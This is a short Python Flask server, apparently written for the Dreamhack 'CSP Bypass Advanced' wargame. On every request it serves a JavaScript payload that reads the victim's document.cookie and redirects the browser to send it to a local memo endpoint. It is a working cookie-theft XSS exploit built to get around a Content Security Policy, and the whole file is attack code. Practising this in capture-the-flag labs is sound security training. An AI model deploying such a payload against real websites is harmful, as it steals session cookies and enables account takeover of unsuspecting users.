
import os
from flask import Flask, Response, request

app = Flask(__name__)

# Dreamhack CSP Bypass Advanced 실습용 페이로드
PAYLOAD = """
location.href =
    'http://127.0.0.1:8000/memo?memo=' +
    encodeURIComponent(document.cookie);
"""

@app.route("/", defaults={"path": ""}, methods=["GET", "HEAD"])
@app.route("/<path:path>", methods=["GET", "HEAD"])
def serve_payload(path):
    app.logger.info("JavaScript requested: %s", request.path)

    return Response(
        PAYLOAD,
        status=200,
        content_type="application/javascript; charset=utf-8",
        headers={"Cache-Control": "no-store"}
    )

if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", "8080"))
    )
